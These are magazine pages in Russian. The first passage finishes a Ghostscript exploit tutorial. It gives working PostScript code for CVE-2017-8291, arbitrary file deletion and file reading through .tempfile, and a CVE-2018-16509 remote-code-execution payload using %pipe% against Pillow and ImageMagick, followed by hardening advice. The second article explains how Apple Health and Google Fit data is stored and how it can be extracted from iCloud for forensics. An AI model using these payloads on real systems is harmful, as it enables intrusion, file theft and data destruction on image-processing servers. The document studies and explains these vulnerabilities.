Конец буфера обозначается последовательностью бай тов 0xff.





      Момент перед манипуляцией со стеком при помощи aload

Продолжим выполнение программы. Теперь, пос ле выполнения aload, дно
стека  находится по адресу 0x5555574a1988,  а  ука затель  на  стек —
0x555556fe4138. То есть теперь он ука зыва ет на ранее выделенную память
строкового буфера.





            Манипуляция со стеком при помощи aload

Когда только указатель стека переназначен, мы можем использовать .eqproc
для переполнения. При помощи buffersearchvars сохраняются перемен‐
ные поис ка, и экс плоит в цикле проверяет, был ли изменен байт 0xff в конце
строки во всех буферах. Это нужно для того, что бы определить, что указатель
стека (osp) достиг нужного нам диапазона и перекрыва ется со строковым
буфером.
  Добавим еще немного print для упрощения отладки.


CVE-2017-8291.png
58:     buffercount {
59:         buffers buffersearchvars 1 get get
60:         buffersizes buffersearchvars 1 get get
61:         16 sub get
62:         254 le { % Перезаписан ли байт 0xff?
63:             buffersearchvars 2 1 put
64:             buffersearchvars 3 buffers buffersearchvars 1 get
get put
65:             buffersearchvars 4 buffersizes buffersearchvars 1
get get 16 sub put
66:         } if
67:         buffersearchvars 1 buffersearchvars 1 get 1 add put
68:     } repeat
69:
70:     buffersearchvars 2 get 1 ge {
71:         exit
72:     } if
73:     %(.) print
74: } loop
...
79: sdevice 0 % Сохраняем указатель на объект девайса
80: currentdevice
81: (before convert to string type) print
82: buffersearchvars 3 get buffersearchvars 4 get 16#7e put
83: buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put %
Записываем конструкцию 0x127e, тем самым меняем тип объекта на string
84: buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put
85: (convert completed) print
...
89: buffersearchvars 0 get array aload
90: (LockSafetyParams‐>1) print
91: sdevice 0 get
92: 16#3e8 0 put
93: (LockSafetyParams‐>0) print

Используем строковый буфер (string buﬀer), чтобы переписать тип объекта
device сле дующе го сте ка и сделать его строковым (string). Для этого запишем
конструкцию 0x127e вмес то 0x1378.





    Перезапись типа объекта устройства: device превращается в string

Полученный объ ект нужно сохранить в массиве sdevice и, наконец, переза‐
писать свой ство LockSafetyParams для того, что бы отключить песочницу
и обойти режим SAFER. Флаг находится по смещению 0x3e8 относительно
объекта.





     Свойство LockSafetyParams установ лено в true, но это только пока

В дан ный момент он уста новлен в true. Но после выполнения 16#3e8 0 put
флаг сбра сыва ется, и эксплоит успешно завер шает работу выпол нением ука‐
занного пей лоада.





           Отключение песочницы и успешная эксплуата ция

С GhostButt разобрались, мож но переходить к недав ним уяз вимостям.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ЗЛАЯ КАРТИНКА
           РАЗБИРАЕМ УЯЗВИМОСТЬ В GHOSTSCRIPT,
                 ЧТОБЫ ЭКСПЛУАТИРОВАТЬ PILLOW
                             И IMAGEMAGICK





НОВЫЕ ПРОБЛЕМЫ В GHOSTSCRIPT И УЯЗВИМОСТЬ CVE-2018-
16509
Теперь будем использовать бинарник Ghostscript версии 9.23.


$ cp ~/ghostscript‐9.23‐linux‐x86_64/gs‐923‐linux‐x86_64 /usr/bin/gs

Если еще не устал от дебага, то бери утилиту с отладочной информацией.


$ cp ~/ghostscript‐9.23/debugbin/gs /usr/bin/gs

Тавис Орманди нашел еще целую пачку уязвимостей. Давай рассмотрим их
в порядке увеличе ния критичности.
  В опи сании функции setcolor сказано, что про верка операнда не тре‐
буется, так как он скрыт за псевдооперато ром с тем же именем и может быть
использован только в определенных ситуациях.


/ghostscript-9.23/psi/zcolor.c
263:  /* This operator is hidden by a pseudo‐operator of the same
name, so it will
264:  * only be invoked under controlled situations. Hence, it does
no operand
265:  * checking.
266:  */
267: static int
268: zsetcolor(i_ctx_t * i_ctx_p)
269: {

Однако ты можешь вызвать его косвенно через setpattern, поэтому провер‐
ка необходима. Команда << /whatever 16#414141414141 >> setpattern
вызывает ошибку сег ментации.





    Вызов setcolor через setpattern и ошибка сегментации в Ghostscript

Следующая ошиб ка типа «несоответствие типов» (type confusion) была обна‐
ружена в параметре LockDistillerParams. Он дол жен иметь логический тип,
но это ниг де не проверяется.


/ghostscript-9.23/devices/vector/gdevpsdf.h
105:     bool LockDistillerParams;

Поэтому конструкция << /LockDistillerParams 16#4141414141414141 >>
.setdistillerparams также вызовет ошибку сегментации.





        Ошибка type confusion в параметре LockDistillerParams

Проблема под номером три закралась в функцию ztempfile. В качес тве
аргу ментов ей нужно передать имя файла и флаги режима его открытия
(запись, чтение и так далее).


/ghostscript-9.23/psi/zfile.c
695: /* <prefix|null> <access_string> .tempfile <name_string> <file>
*/
696: static int
697: ztempfile(i_ctx_t *i_ctx_p)
698: {
699:     os_ptr op = osp;
700:     const char *pstr;
701:     char fmode[4];
702:     int code = parse_file_access_string(op, fmode);
703:     char *prefix = NULL;
...
712:     prefix = (char *)gs_alloc_bytes(imemory, gp_file_name_sizeof
, "ztempfile(prefix)");
713:     fname = (char *)gs_alloc_bytes(imemory, gp_file_name_sizeof,
 "ztempfile(fname)");
714:     if (!prefix || !fname) {
715:         code = gs_note_error(gs_error_VMerror);
716:         goto done;
717:     }

Только вот если передать полный путь, то вместо того, чтобы отбросить его
и положить времен ный файл в директорию tmp, где ему самое место, Ghost‐
script соз даст его в указанной директории.
  Для проверки воспользуемся утилитой strace.


$ strace ‐fefile gs ‐sDEVICE=ppmraw ‐dSAFER



  (/proc/self/cwd/gigity) (w) .tempfile





  Создание фай ла вне временной директории при помощи tempﬁle
  в Ghostscript

Как видишь, есть небольшая проб лема — префикс (preﬁx). Он мешает эксплу‐
атировать эту уязвимость по полной программе. Если будет интересно,
можешь попробовать обойти это поведение.
  После этого можно писать в файл любые данные с помощью writestring.
Не забудь закрыть файл, когда закончишь.


dup
(hello) writestring
closefile

Тут нас поджидает еще одна проблемка. После завершения работы Ghost‐
script вре мен ный файл будет удален.





  Удаление времен ного файла после завершения работы утилиты
  Ghostscript

Решается она просто: нужно не дать утилите нормально завершить работу.
Подойдет любой из багов, которые крашат GS.





  Обход удаления времен ного файла после выполнения функции tempﬁle
  в Ghostscript

Чтобы удалить произвольный файл, можно вос пользовать ся конструкцией


{ .bindnow } stopped {} if
(/etc/passwd) [] .tempfile

После завершения работы GS указанный файл будет удален.





          Удаление произволь ного файла с помощью Ghostscript

Еще Орманди придумал, каким образом можно читать любые фай лы, дос‐
тупные пользователю. Он написал функцию, которая интерпретирует содер‐
жимое файла PostScript и ловит ошиб ки син таксиса. Будь аккуратнее: так
как тут используется функция tempfile, после завершения скрипт Ghostscript
попытается удалить про читанный файл.


fileread.ps
01: /FileToSteal (/etc/passwd) def
02: errordict /undefinedfilename {
03:     FileToSteal % save the undefined name
04: } put
05: errordict /undefined {
06:     (STOLEN: ) print
07:     counttomark {
08:         ==only
09:     } repeat
10:     (\n) print
11:     FileToSteal
12: } put
13: errordict /invalidfileaccess {
14:     pop
15: } put
16: errordict /typecheck {
17:     pop
18: } put
19: FileToSteal [] .tempfile
20: statusdict
21: begin
22:     1 1 .setpagesize
23: end
24: quit





                 Чтение файлов при помощи Ghostscript

С Ghostscript версии 9.24 такие трюки уже не сработа ют, потому что раз‐
работчики добави ли проверку пути при выполнении tempfile. Сравни две
версии фай ла zfile.c.


/ghostscript-9.23/psi/zfile.c
736:     if (gp_file_name_is_absolute(pstr, strlen(pstr))) {
737:         if (check_file_permissions(i_ctx_p, pstr, strlen(pstr),
738:                                    NULL, "PermitFileWriting") <
0) {
739:             code = gs_note_error(gs_error_invalidfileaccess);
740:             goto done;
...
782:     make_string(op ‐ 1, a_readonly | icurrent_space, fnlen,
sbody);
783:     make_stream_file(op, s, fmode);
784:
785: done:


/ghostscript-9.24/psi/zfile.c
764:     if (gp_file_name_is_absolute(pstr, strlen(pstr))) {
765:         int plen = strlen(pstr);
766:         const char *sep = gp_file_name_separator();
767: #ifdef DEBUG
768:         int seplen = strlen(sep);
769:         if (seplen != 1)
770:             return_error(gs_error_Fatal);
771: #endif
772:         /* strip off the file name prefix, leave just the direct
ory name
773:          * so we can check if we are allowed to write to it
774:          */
775:         for ( ; plen >=0; plen‐‐) {
776:             if (pstr[plen] == sep[0])
777:                 break;
778:         }
779:         memcpy(fname, pstr, plen);
780:         fname[plen] = '\0';
781:         if (check_file_permissions(i_ctx_p, fname, strlen(fname)
,
782:                                    NULL, "PermitFileWriting") <
0) {
783:             code = gs_note_error(gs_error_invalidfileaccess);
784:             goto done;
...
826:     make_string(op ‐ 1, a_readonly | icurrent_space, fnlen,
sbody);
827:     make_stream_file(op, s, fmode);
828:     code = record_file_is_tempfile(i_ctx_p, (unsigned char *)
fname, fnlen, true);

А на сладкое у нас — выполнение произвольных команд. Только на этот раз
все гораз до проще и не нужно никаких манипуляций со стеком и прочей
бинарщины. Оказывается, провер ки типа invalidaccess перестают работать
после некорректного использования команды restore. Нам нужно лишь
обработать ошибку и спокойно выполнять команды уже известным способом,
с помощью OutputFile.


legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
showpage





          RCE‐экс плоит для Ghostscript 9.23 успешно отработал

А что там у нас с веб‐сервером на Python? Ты, навер ное, уже и позабыл
про него. Тут все прос то — отправляем наш век тор в файле, используя любое
из раз решен ных расширений, например png, и не забываем про хидер %!PS.


CVE-2018-16509.png
01: %!PS‐Adobe‐3.0 EPSF‐3.0
02: %%BoundingBox: ‐0 ‐0 100 100
03:
04: userdict /setpagedevice undef
05: save
06: legal
07: { null restore } stopped { pop } if
08: { legal } stopped { pop } if
09: restore
10: mark /OutputFile (%pipe%uname ‐a > /tmp/owned) currentdevice
putdeviceprops





  Успешная эксплуатация RCE‐уязвимос ти Python‐библиоте ки Pillow через
  Ghostscript 9.23

Шалость удалась, и команда была выполнена на целевой машине.
  Но не только Pillow использует Ghostscript в качестве сторонней утилиты,
таким же методом пользуется небезызвестный ImageMagick.


/ImageMagick6/6.9.7-4/www/source/delegates.xml





Строка вызова бинарника gs немного отли чает ся от таковой в Pillow, но это
не мешает этому же экс плоиту отрабатывать на ура.





              RCE в ImageMagick через Ghostscript


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Сегодня мы немного окунулись в дебри языка PostScript и посмотрели
на при чины уязвимос ти в одном из его интерпретаторов — Ghostscript.
Разобрались, какими опасными могут быть простые картинки, даже несмотря
на белые спис ки форматов.
   Если ты пишешь или администри руешь веб‐приложение, принимающее
картинки, и хочешь обезопасить себя, то советую мак симально ограничить
обработку файлов PS, EPS, PDF и XPS. Если это все же необходимо, то
работай  с ними  в  максимально  огра ниченной  среде.  Также  никог да
не доверяй содержимому любых загруженных пользователем файлов и не
начинай их обработку, пока не убедишься в их легитимности.
   Ну и конечно, следи за новостями в области безопас ности и вовремя
обновляйся!
ПРИВАТНОСТЬ

   КАК APPLE И GOOGLE
 ЗАЩИЩАЮТ «ЗДОРОВЬЕ»
    ПОЛЬЗОВАТЕЛЕЙ





      ИЗВЛЕКАЕМ И СРАВНИВАЕМ
        ДАННЫЕ APPLE HEALTH
          И GOOGLE FIT





Бум носимых  устройств,  раз нооб разных
датчиков, брас летов, часов и трекеров про‐
должается более пяти лет. Индус трия пред‐
лагает широкое разнооб разие устройств,
которые  могут  собирать  информа цию           Олег Афонин                                                                                      Эксперт по мобильной
о состоянии твоего организма. Комбинация       криминалистике«Элкомсофт»компании
данных с такого устройства и информации        aoleg@voicecallcentral.com
о твоем мес тополо жении позволя ет вос‐
становить пол ную картину твоей деятель‐
ности   буквально  по  минутам.  Такая
информация не должна попасть в руки зло‐
умыш ленни ков  или  нечистоплот ных  рек‐
ламода телей; эта же информа ция бес ценна
для рассле дова ния преступлений, пос коль‐
ку поз воля ет вос становить картину про‐
исшествия с точной привязкой ко времени.
Сегодня мы подробно рассмотрим, какие
данные о тебе собирают стандар тные при‐
ложения Apple Health (iOS) и Google Fit (An‐
droid), как и где эти дан ные сох раня ются,
куда  синхронизируют ся,  как  защище ны
и как их можно извлечь.


APPLE HEALTH: ПРИЛОЖЕНИЕ «ВСЕ В ОДНОМ»
Приложение Apple Health появилось в сентябре 2014 года одновременно
с выходом iOS 8 и с тех пор при сутс твует на всех устройствах iPhone.
   Apple Health работает в фоновом режиме незави симо от того, желаешь ты
воспользоваться его воз можностями или нет. Приложение использует дан‐
ные  от  встро енных  в  iPhone  датчиков  для  составления информа ции
об активнос ти поль зователя.
  В экосистеме Apple есть и устройство‐компаньон для сбора дополнитель‐
ных дан ных, которые не может предоставить iPhone. Это Apple Watch, которые
в разных модификациях позволя ют измерять пульс, определять степень
активнос ти пользователя, детектировать падения и снимать электрокардиог‐
рамму.





Пользователям, запустившим при ложе ние Apple Health, доступны четыре
основные катего рии данных:
 • Activity, в которой можно увидеть активность пользователя;
 • Nutrition, где показывается, что и в каких количествах пользователь ест.
   Регистрируется, если пользователь ведет дневник питания в одном из сто‐
   ронних при ложений;
 • Sleep с анализом данных о сне пользователя;
 • Mindfulness  (осознанность  или  релаксация),  загадочная  категория,
   истинный смысл которой доступен достигшим просветления адептам
   определенных прак тик. С технической точки зрения смыс ловой нагрузки
   не несет, по крайней мере в iOS 11 и 12. Записывается при запуске при‐
   ложения Breathe на Apple Watch или при работе одного из сторонних при‐
   ложений.

Откуда поступают данные, на основе которых при ложение отображает всю
эту информацию? Все данные собира ются от устройств и приложений,
работающих по протоколу HealthKit. Сюда входит как сам iPhone, так и часы
Apple Watch, а так же различные сторонние устрой ства и приложения — брас‐
леты, часы, трекеры, разнообразные спортивные и медицинские датчики
и приборы. Для работы сторонних приложений необходимо предос тавить им
доступ к информации Apple Health, что само по себе несет определенные
риски.





При этом в самом приложении Apple Health для каждой категории данных
официально рекомен дуется не одно, а сразу несколько приложе ний —
начиная с печально известно го Strava.





Кроме того, доступны следующие расширенные категории данных:
 • Body Measurements — рост и вес пользователя;
 • Health Records — больничные карты и докумен ты в формате СDA;
 • Heart — кровяное давление и пульс;
 • Reproductive Health — менс тру альные циклы и данные о работе репродук‐
   тивной системы;
 • Results — результаты лабора торных анализов (нап ример, уровень сахара
   в крови);
 • Vitals — жизненные параметры организма (давление, температура, пульс,
   дыхание…);
 • Medical ID — медицинские параметры организма (нап ример, группа кро‐
   ви).

Очевидно, что далеко не все данные (и даже не зна чительная их часть) могут
быть определены с помощью бытовых устройств, даже если речь идет о пос‐
леднем поколе нии Apple Watch. Отку да же берутся все эти данные? Здесь
нужно вспомнить о том, что в мар те 2018 года Apple сумела договорить ся
с рядом сетевых клиник в США, Великобритании и Австралии о стандарти‐
зации элек трон ного формата медицинской информации и о переда че этих
данных. Речь идет об архитектуре CDA — Clinical Document Architecture,
которая стала стан дартом де‐фак то для обмена медицинскими данными.
   Стандарт CDA основан на XML, а документы в этом формате могут быть
импортированы и обработа ны в приложении Apple Health (категория Health
Records). Акту альность CDA для России в настоящее время невысока:
получить соот ветствующий файл можно только из одного из под держи‐
вающих архитектуру CDA медицинских учреждений. Для импорта данных
в Apple Health его дос таточно открыть в приложении, пос ле чего информа ция
будет занесена в базу данных. Данные автоматически синхронизируются
с другими устройствами Apple через облако iCloud.





Медицинские  карты,  результаты  лабораторных  ана лизов,  данные  наб‐
людений,  рецепты,  прививки,  аллергичес кие  реакции  и  другие  виды
информа ции, входящие в Health Records, составляют медицинскую тайну,
которая в большинстве стран защищается законодательно. Тем удивитель‐
нее стал подход к защите этих данных, который выбрала Apple в iOS 11. В этой
версии операционной системы данные Health Records могли состоять только
из документов CDA; эти данные син хронизи ровались с iCloud точно так же,
как синхронизируются фотографии или замет ки. Иными словами, никакой
дополнительной защиты предус мотрено не было, и данные Health Records
можно было извлечь при помощи Apple ID и пароля, получить по зап росу
у Apple или посредством GDPR, наконец — украсть из облака.
  Для iOS 11 верны следующие утверждения:
 1. Для дос тупа к данным Health дос таточ но Apple ID, пароля и одноразового
   кода двух фактор ной аутентификации.
 2. Дан ные доступны компании Apple.
 3. Дан ные выдаются правоохранительным органам по запросу.
 4. Дан ные выдаются через запрос GDPR.
 5. Мо гут быть извлечены сторонними при ложениями.

В iOS 12 эту проблему исправили. В новой версии ОС данные Apple Health
в целом и Health Records в частности перенесли в отдельный кон тейнер,
который получил допол нительный уровень защиты. Данные в новом контей‐
нере шифруют ся клю чом из связки ключей (Keychain), который, в свою оче‐
редь, зашифрован ключом шифрования связки клю чей. Ключ шифрования
связки ключей перешифрован ключом, который вычисляется на основе пас‐
скода (iOS) или системного пароля (macOS) поль зователя. Такой механизм
защиты дос таточно сложен и безопасен, а для того, чтобы извлечь данные
«Здоровья» из облака iCloud, потребуются абсолют но все данные из сле‐
дующего спис ка:
 1. Apple ID и пароль пользователя.
 2. Одноразо вый код двух факторной аутентификации (на учетных записях
   без 2FA синхронизация просто не включится).
 3. Код бло киров ки или системный пароль одно го из устройств пользователя,
   которые уже участвуют в синхрониза ции.

Прямые следствия такого способа защиты данных:
 1. У обыч ного пользователя не возникает особых проблем с синхро низацией
   данных: дос таточно настроить новое устрой ство и ввести код блокировки
   экрана от пре дыду щего iPhone или iPad.
 2. Компания Apple не имеет дос тупа к данным «Здо ровья» пользователя,
   синхронизирован ным с устройств под управле нием iOS 12.
 3. Дан ные не выдаются правоох ранительным органам и по зап росам GDPR
   (не могут быть расшифрованы).
 4. Доступ сторонних приложе ний ограничен (но возможен, см. Elcomsoft
   Phone Breaker).


ГДЕ ХРАНЯТСЯ ДАННЫЕ APPLE HEALTH
На самом iPhone данные хранятся в каталоге /private/var/mobile/Li‐
brary/Health/.





В ней находятся две связанные базы данных в формате SQLite: healthdb.
sqlite и healthdb_secure.sqlite. В этих базах данных содержится вся
информа ция, за исключением точных коор динат тренировок пользователя
(тех самых координат, которые часы Apple Watch начинают собирать сплош‐
ным потоком с периодичностью в одну секунду, если определяют момент
начала тренировки). Данные о местоположении сохраняются в зашиф рован‐
ную базу данных healthdb_secure.hfd.





В базе данных healthdb.sqlite содержится информация об источниках дан‐
ных. В базе healthdb_secure.sqlite хранится основная информация с час‐
тыми отсылками к пер вой базе.





Начиная с iOS 11 Apple Health исполь зует синхрониза цию в обла ко iCloud.
Синхронизируются данные, соб ранные приложением Apple Health; записи
CDA, нас колько нам известно, в обла ко не поступают. Не синхронизируется
и уникаль ный для каждого устройства идентификатор Medical ID. Многие сто‐
ронние приложения (Strava, Endomondo и другие) синхронизируют данные
в собственные облачные сервисы.
  В iOS 11 данные «Здоровья» синхронизируются так же, как и остальные
виды синхронизирован ных данных: они поступа ют в отдельный контейнер
в iCloud, откуда их можно извлечь в виде отдельных фрагментов и расшифро‐
вать каж дый фрагмент при помощи ключей, которые также извле каются
из iCloud. Физическая безопас ность данных обес печивается исклю читель но
тем, что сами данные хранятся на одних серверах (которые, кстати, принад‐
лежат Microsoft, Google, AT&T или китайской государственной компании, если
речь идет о китайских поль зователях) в зашифрованном виде, а ключи рас‐
шифровки физически хранятся только на серверах самой компании Apple
в Купертино. Таким образом, ни Microsoft, ни Google, ни китай ское правитель‐
ство прямого дос тупа к данным не име ет (они зашифрованы), но если извес‐
тны логин и пароль пользователя — расшифровать их вполне можно. Такая
информа ция выдается правоохранительным органам и по зап росу GDPR.
   Гораздо интереснее дела обстоят в iOS 12. В новой вер сии сис темы пре‐
дусмотрена дополнительная защита данных «Здоровья». Для обеспечения
обратной сов местимости с устройствами с iOS 11 данные, собранные iOS 12,
попадают в отдельный контейнер (при этом старый, незащи щенный кон тей‐
нер сохраняется, и данные из него будут про читаны устройства ми с iOS 12).
Насколько нам извес тно, незащи щенный контейнер сохраняется в облаке
до тех пор, пока есть хотя бы одно устройство с iOS 11, которое участвует
в облачной синхронизации «Здо ровья». Как только все устройства обновля‐
ются до iOS 12, незащищенный контейнер должен пропасть из облака (фак‐
тически это может происходить после длительной, иногда — очень длитель‐
ной задер жки).
  Данные в новом, защищен ном контейнере будут дополнительно зашиф‐
рованы при помощи ключа, который хранится в облачной связке ключей
(iCloud Keychain). Извлечь этот ключ можно лишь после извлечения и рас‐
шифровки самого iCloud Keychain, зашифрованного, в свою очередь, ключом,
который вычис ляется на осно ве кода блокиров ки (или системно го пароля)
пользователя. Таким образом, данные из нового контей нера невозможно
расшифровать без кода блокиров ки от iPhone или пароля от компьюте ра
Mac.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

    КАК APPLE И GOOGLE ЗАЩИЩАЮТ
      «ЗДОРОВЬЕ» ПОЛЬЗОВАТЕЛЕЙ
               ИЗВЛЕКАЕМ И СРАВНИВАЕМ ДАННЫЕ
                         APPLE HEALTH И GOOGLE FIT





КАК ИЗВЛЕЧЬ ДАННЫЕ APPLE HEALTH
Если у тебя есть физический доступ к iPhone и тебе известен код бло кировки,
экспортировать дан ные Apple Health не просто, а очень просто. Достаточно
открыть приложение Health и вос пользоваться штат ной функци ей экспорта.
Приложение создаст ZIP‐архив, который ты можешь сразу же отправить себе
через AirDrop.





Еще можно сделать локальную резервную копию iPhone через iTunes, обя‐
зательно с паролем (если пароль на резер вную копию не будет установлен,
то данные Health не сохраняются в бэкап). В резервную копию записы ваются
оригиналь ные базы данных, а не экспортированные данные.
   Если на iPhone установлен jailbreak, то мож но снять образ файловой сис‐
темы и получить доступ к указанным базам данных.
   Если же физического дос тупа к iPhone у тебя нет, то извлечь информацию
можно из облака iCloud. В зависимости от того, под какой версией iOS
работает устрой ство поль зователя (11 или 12), тебе может потребоваться
код блокировки одного из устройств, которые участвовали в синхрониза ции.
Для извлечения и расшифровки мы пользовались утилитой Elcomsoft Phone
Breaker.
   Если хотя бы одно из устройств пользователя работает на iOS 11:
 1. За пус каем Elcomsoft Phone Breaker.
 2. Выбира ем Apple → Synced data.





 3. Выделяем Health.





 4. Вво дим логин, пароль и одноразовый код двухфактор ной аутен тификации.





 5. Зап рос пасско да пропус каем.
 6. Ска чивается и расшифровывается та часть данных, которая хранится
   в первом (незашифрованном) контейнере.

Если все устройства поль зователя работают под управлением iOS 12, то пер‐
вого (незашиф рованного) контейнера в облаке может не быть. В этом слу чае
тебе потребуется ввес ти код блокировки iPhone, который уже участвует в син‐
хронизации.
 1. За пус каем Elcomsoft Phone Breaker.
 2. Выбира ем Apple → Synced data.
 3. Выделяем Health.
 4. Вво дим логин, пароль и одноразовый код двухфактор ной аутен тификации.
 5. Выбира ем устройство, которое участвует в синхронизации Apple Health.





 6. Вво дим код блокировки или системный пароль от выбранно го устройства.





 7. Ска чиваются и расшифро вываются все данные как из первого (незашиф‐
   рованного), так и из второго (зашифрованного) контейнера.

Данные ска чиваются так же, как и в случае с первым контейнером, однако
требуется дополнительно скачать и расшифровать ключ из iCloud Keychain,
которым будут зашифрованы базы дан ных Health.
   Теперь дан ные мож но просмотреть и про ана лизи ровать.





Как это работа ет?
Извлечение из первого (незащищенного) контейнера отра ботано на пре‐
дыдущих типах син хро низированных данных. Для этого требует ся авто ризо‐
ваться в iCloud, после чего:
 1. По лучить зашифрованный список фрагментов (chunks).
 2. Зап росить список зон.
 3. Зат ребовать синхронизацию зон.
 4. Зат ребовать ссылки на файлы.
 5. Ска чать файлы.





Запрашива ем спи сок зон:


 contaiterId: "com.apple.health.sync"
 bundleId: "com.apple.healthd"


 • Все зоны начинаются с PrimarySyncCircle.
 • Далее   следует    UUID,   нап ример   1AA8B4D0‐9B73‐4D88‐A740‐
  BFE04DD8A5AC.
 • Новые зоны соз даются при каждом вхо де в учетную запись.
 • Зоны периодически сливаются.

Запрашива ем синхро низа цию зон. Резуль тат:


 container {
   str: "PrimarySyncCircle:AF64D629‐3688‐4062‐9503‐BE97B45D5BC2"
   num: 6
 }
 propertyName {
   name: "ChangeSet"
 }
 propertyValue {
   valueType: 6
   authInfo {
     owner1Dsid: "8888888888"
     fileChecksum: "\001\233\254\2671GQ\316\324mM\243\031\254\322|\0
 17\364\233N\f"
     structSize: 13465
     token: "B3B9SvMwRNXBK6fGaX6vOuVLwfbWA1H5QwEAAAMR7kM"
     url: "https://p29‐content.icloud.com:443"
     owner2Dsid: "8888888888"
     wrapped_key {
       name: "\003_\242\000\335\266\255\312\0304\226e\344\333\235\227
 \226a\266\323H\364\021DM3\341\020~B\337O\346\016\017\357\375C[\346\3
 01\311\356\261"
     }
     fileSignature: "\001\310\273\331\332\326a\337\202Xd\035e`p\277\3
 21\226\211\222\312"
     downloadTokenExpiration: 1529588220
   }
 }


Скачиваем файлы. Все файлы доступны в виде списка фрагментов. Каждый
фрагмент должен быть расшифрован. При запросе син хронизации воз вра‐
щается ключ шиф рования индивидуальных ключей фрагментов (wrapped_key),
который  должен  быть  расшифрован.  При  помощи  расшифрованного
wrapped_key мы можем расшифровать каждый из ключей шифрования
для отдельных фраг ментов. Наконец, уже эти ключи используются для рас‐
шифровки инди видуальных фрагментов файлов. Расшифрованные фраг‐
менты объединяются в фай лы, которые и сохраняются на диск.



GOOGLE FIT: АНАЛОГ APPLE HEALTH ДЛЯ ANDROID
В экосистеме Google нет штатного ана лога системы «Здоровье» в том виде,
как она реализова на в iOS. Но есть Google Fit, при ложение, которое можно
установить на телефон из Play Store. Различий между Apple Health и Google Fit
масса.


Ко личество и раз нообразие собираемой и отображаемой
информации
В приложении Apple Health, как мы видели, агрегируется огромное количес‐
тво типов данных из массы источников. При этом агрегируются только те типы
данных, которые предусмотрены разработчиками Apple, но их, как правило,
приложение в состоянии коррек тно отобразить и проанализировать.
  Обратная сторона медали — в при ложе нии Apple Health отображаются
сразу все доступные типы дан ных, даже если информации как таковой там
нет. С непривычки такое обилие дан ных просто запутывает. Что такое Mind‐
fullness? Почему для пользователей мужского пола отображается целый спи‐
сок непонятных слов в разделе Reproductive Health? (Так, для справ ки, у них
просто отсутствуют те орга ны, состояние которых приложе ние Apple Health
«измеряет» у пользователя.) Откуда берутся данные о том, какое количество
кальция, меди или железа я употребил на обед, а если эти стро ки пустые, то
зачем они выводятся на главный экран? У меня нет разумных ответов на эти
вопросы (специалис ты‐дието логи наверняка знают, как и те, кто вынуж ден
плотно следить за балансом микроэле ментов). Веро ятно, это сво еобразная
реклама в стиле «я еще и вышивать умею». Приложение Apple Health зап‐
редельно  перегружено  пус той,  нерелевантной  и  прос то  «мусорной»
информа цией и при учает пользователей игнориро вать целые огромные раз‐
делы.
   Google Fit — противополож ность решению от Apple. Приложение агре‐
гиру ет минимум информа ции: количество шагов, пройденное расстояние,
данные о том, сколько времени пользователь провел в движении (Move
Points), и данные о том, сколько вре мени пользователь провел в активном
движении (данные Heart Points). Интерес ный момент: различные сторонние
приложения и дат чики могут сообщать (а могут и не сообщать, жес тких тре‐
бований  у Google  нет) многочисленные дополнительные виды данных,
и Google Fit сох ранит их и син хронизирует с облаком. При этом поль зователю
такие данные не будут видны: в интерфейсе Google Fit просто нет соответс‐
твующих возможнос тей.


Google Fit и интегра ция со сто ронними приложе ниями
Так же как и Apple Health, Google Fit поддерживает интеграцию со сторонними
приложениями. Но если в приложении Apple Health есть масса предоп‐
ределенных категорий для самой разнообразной информации, то Google Fit
способен отображать лишь ограниченное число типов данных. Более того,
производителям датчиков и приложений, совместимых с Apple HealthKit, при‐
ходится отдавать в Apple Health всю или почти всю информацию, которую
собирает устройство или приложение, — таково требование Apple. А вот
у Google таких требований нет. В результате, к примеру, брас леты Samsung
отдают информацию только приложению от Samsung, которое, в свою оче‐
редь, просто не передает данные в Google Fit. Подобным же образом ведут
себя брас леты Garmin; что интересно, те же самые брас леты совершенно
спокойно отдают данные в Apple Health, если у поль зователя iPhone.
  Из всего перечисленного есть несколько важных следствий.
 1. Одни и те же браслеты и сто ронние при ложе ния почти всегда отдают
   в Apple Health больше информации, чем они же переда ют в Google Fit.
 2. Apple Health стандартизирует данные; в приложение невозможно передать
  информа цию, не описанную в HealthKit, но та, которую передали, может
   быть прос мотрена и проанализирова на пользователем.
 3. Google Fit принимает любые данные, даже те, о которых не знает ничего.
   Эти дан ные сохраняются и син хронизируются в учетной записи поль‐
   зователя, но через само при ложе ние Google Fit увидеть их невозможно.



                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

    КАК APPLE И GOOGLE ЗАЩИЩАЮТ
      «ЗДОРОВЬЕ» ПОЛЬЗОВАТЕЛЕЙ
               ИЗВЛЕКАЕМ И СРАВНИВАЕМ ДАННЫЕ
                         APPLE HEALTH И GOOGLE FIT





Срав нение с Apple Health
В отличие от iPhone приложение Google Fit не использует встроенные в смар‐
тфон датчики — в частности, не используется встроенный во многие телефо‐
ны  шагомер.  Данные  об  активности  пользователя  аппроксимируются
на основе дан ных Signiﬁcant Movement (это то самое, что позволяло смартфо‐
нам с Android 6.0 «засыпать» в режим Doze), данных служб геолокации (чаще
всего — даже не со спутников, а вычис ленных при помощи мобиль ных вышек)
и той информации, которую вводит о себе пользователь при настройке при‐
ложения (рост, вес и возраст).
  Соответственно, если взять на прогулку iPhone и, к при меру, Google Pixel,
то, про анализировав дан ные после возвращения, мы увидим совершенно
разную информацию.
   Вот наглядный при мер. Из пятича совой поездки (час двадцать на машине,
прогулка, обед, короткая поездка на машине и воз вращение домой) при‐
ложение Apple Health сделало следующие выводы.





Apple Health: пройдено 3287 шагов, 2,6 км дистанция, калорий 222 + 1342 =
1564, вре мя физической активности — неизвестно, но дает девять минут
«упражне ний» и время «stand hours» — пять часов (это сов сем не так, пять
часов — это общее время, в течение которого на руке были часы Apple Watch;
из них около двух с половиной часов заняла поездка в машине).
  Данные доступны в формате XML; за час зарегистрировано несколько
десятков записей приблизитель но следующего содержания. Пример записи
(в дальнейшем мы нормализуем записи в виде таблиц для упрощения вос‐
приятия информации):


<Record type="HKQuantityTypeIdentifierHeartRate" sourceName="Oleg’s
Apple Watch" sourceVersion="5.1.2" device="<<HKDevice: 0x2832ab610>,
name:Apple Watch, manufacturer:Apple, model:Watch, hardware:Watch4,
